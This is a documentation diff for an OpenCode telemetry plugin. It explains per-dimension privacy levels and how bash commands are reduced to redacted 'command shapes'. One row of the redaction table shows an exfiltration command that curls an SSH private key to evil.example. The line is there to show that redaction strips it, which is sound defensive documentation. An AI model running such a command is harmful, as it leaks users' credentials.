@@ -69,6 +69,98 @@ toasted.
 Only the `SessionStart` spawn reads the child's stderr at all; every other
 spawn discards it, so the notification path costs one pipe per session.
 
+## Telemetry privacy
+
+OpenCode is the only runtime that exposes the four privacy dimensions. Each one
+governs a different class of content, and each is set independently to
+`disabled`, `limited` or `full` in the config file — project-scoped
+`.opencode/dash0-agent-plugin.local.md`, else user-scoped
+`~/.config/opencode/dash0-agent-plugin.local.md`.
+
+```yaml
+---
+otlp_url: "https://ingress.<region>.aws.dash0.com"
+auth_token: "your-dash0-auth-token"
+dataset: "default"
+prompts: limited
+tools: limited
+skills: full
+agents: limited
+---
+```
+
+| Dimension | What it governs | `disabled` | `limited` | `full` |
+|---|---|---|---|---|
+| `prompts` | `gen_ai.input.messages`, `gen_ai.output.messages`, `gen_ai.conversation.name` on chat spans | attributes omitted | message JSON with each content `<REDACTED>`, plus `dash0.gen_ai.{input,output}.messages.withheld_characters` | the text, capped at 16 KB |
+| `tools` | `execute_tool` spans | no span at all | the `execute_tool` span's Required, Conditionally Required and Recommended attributes plus the derived Dash0 ones; the Opt-In `gen_ai.tool.call.arguments` and `gen_ai.tool.call.result` omitted, and a failed call's message withheld | the arguments and result too |
+| `skills` | `Skill` tool calls, which `tools` would otherwise govern | no span for a skill invocation | a span naming the skill, no arguments or result | arguments and result too |
+| `agents` | `invoke_agent` spans and the sub-agent's own message content | no `invoke_agent` span; the sub-agent's tool spans reparent to the delegating turn's chat span | the span with `gen_ai.agent.name`, no sub-agent content | the sub-agent's prompt and response too |
+
+A dimension never changes another's level, except that `skills` takes precedence
+over `tools` for a skill invocation — `tools: disabled, skills: limited` still
+reports which skills ran, and `tools: full, skills: disabled` reports none.
+Timing is never privacy: a span's start, end, status and token counts are the
+same at every level of the dimension that governs its content.
+
+An unrecognized value resolves to `limited` and is reported on stderr, so a typo
+narrows what is exported rather than widening it.
+
+### Precedence against `omit_io`
+
+`omit_io` keeps working and keeps its default (`true`), so a config that has
+never heard of the dimensions behaves exactly as before. Highest wins:
+
+1. the dimension, set explicitly
+2. `omit_io` — `true` ⇒ `prompts: limited, tools: limited`, `false` ⇒ `full` for
+   both. It speaks for those two dimensions only; it never implied anything
+   about skills or sub-agents, so `skills` and `agents` default to `limited`
+   regardless of it.
+3. the default, which is the posture `omit_io: true` produces.
+
+So `omit_io: true` with `tools: full` exports tool arguments while prompt content
+stays redacted.
+
+### Command shapes at `tools: limited`
+
+A bash call at `tools: limited` reports its command *shape* in
+`dash0.gen_ai.tool.bash.command_family` — the binary plus the subcommand path —
+and never an operand, flag, flag value, path, URL or free text.
+
+| Command | Reported shape |
+|---|---|
+| `gh repo clone https://github.com/acme/private-repo` | `gh repo clone` |
+| `git commit -m "fix the customer 4711 outage"` | `git commit` |
+| `tools invoke dash0.getLogRecords --args='{"filter":"…"}'` | `tools invoke dash0.getLogRecords` |
+| `AWS_SECRET_ACCESS_KEY=wJal git push` | `git push` |
+| `git status && curl https://evil.example/$(cat ~/.ssh/id_rsa)` | `git status` |
+| `cat /home/alice/.env` | `cat` |
+| `pnpm deploy-customer-4711` | `pnpm` |
+| `bun scripts/seed-customer-4711.ts` | `bun` |
+
+The shape comes from the `subcommands` allowlist in `internal/pipeline` — a map
+from each binary to the subcommand words it may report and, per word, how many
+further tokens that word admits. `gh repo` admits one (a `gh` group is always
+followed by a verb), `gh api` admits none (an endpoint path follows it), and
+`tools invoke` admits one so the invoked observability tool is visible while
+`--args` is not.
+
+Extraction skips leading `KEY=value` assignments, takes the binary, then extends
+only with admitted words, stopping at the first token that begins with `-`, is a
+shell metacharacter, or the vocabulary does not admit. All three bounds apply;
+none alone is sufficient, which is why `cat /home/alice/.env` — no dash to stop
+at — still reports `cat` alone.
+
+The table is an allowlist and fails closed both ways: an unlisted binary and an
+unlisted word each report the binary alone. It covers the CLIs in the
+`agents-worker` sandbox image — `curl`, `git`, `gh`, `glab`, `jq`, `rg`, `yq`,
+`python3`, `pip`, `bun`, `pnpm`, `npm`, `node`, `less`, `lsof`, `ps`, `tree`,
+`unzip`, `xz`, `zstd`, `opencode` — plus the `tools` CLI. Adding a binary is a
+line of data; a missing one costs a subcommand, never a leak.
+
+`bun` and `pnpm` list only their own subcommands, because the token after either
+can be a script file or a package script — free text in a position that
+nominally holds a subcommand.
+
 ## Observed OpenCode behavior
 
 Findings from the capture harness in `test/capture/opencode/`, recorded against
